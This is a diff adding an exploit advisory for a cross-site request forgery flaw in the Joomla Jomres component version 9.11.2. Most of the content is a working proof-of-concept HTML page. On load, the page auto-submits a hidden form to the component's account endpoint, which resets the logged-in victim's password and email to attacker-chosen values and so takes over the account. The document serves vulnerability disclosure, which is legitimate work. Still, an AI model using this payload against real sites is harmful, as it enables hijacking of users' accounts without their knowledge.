@@ -1,0 +1,37 @@
+# Exploit Title: Joomla!Component jomres 9.11.2 - Cross site request forgery
+# Date: 2018-06-15
+# Exploit Author: L0RD
+# Vendor Homepage: https://www.jomres.net/
+# Software link: https://extensions.joomla.org/extension/jomres/
+# Software Download: https://github.com/WoollyinWalesIT/jomres/releases/download/9.11.2/jomres.zip
+# Version: 9.11.2
+# Tested on: Kali linux
+===================================================
+# POC :
+
+<html>
+<head>
+    <title>CSRF POC</title>
+</head>
+<body>
+<form action="http://127.0.0.1/jomres/index.php?cmd=account/index" method="POST">
+      <input type="hidden" name="password" value="decode" />
+      <input type="hidden" name="password&#95;verify" value="decode" />
+      <input type="hidden" name="email" value="borna&#46;nematzadeh123&#64;gmail&#46;com" />
+      <input type="hidden" name="first&#95;name" value="decode" />
+      <input type="hidden" name="last&#95;name" value="test" />
+      <input type="hidden" name="company" value="test" />
+      <input type="hidden" name="vat&#95;no" value="100000000" />
+      <input type="hidden" name="address1" value="test1" />
+      <input type="hidden" name="address2" value="test2" />
+      <input type="hidden" name="city" value="New&#32;York" />
+      <input type="hidden" name="county" value="test" />
+      <input type="hidden" name="postalcode" value="100001" />
+    </form>
+<script>
+   document.forms[0].submit();
+</script>
+</body>
+</html>
+
+===================================================
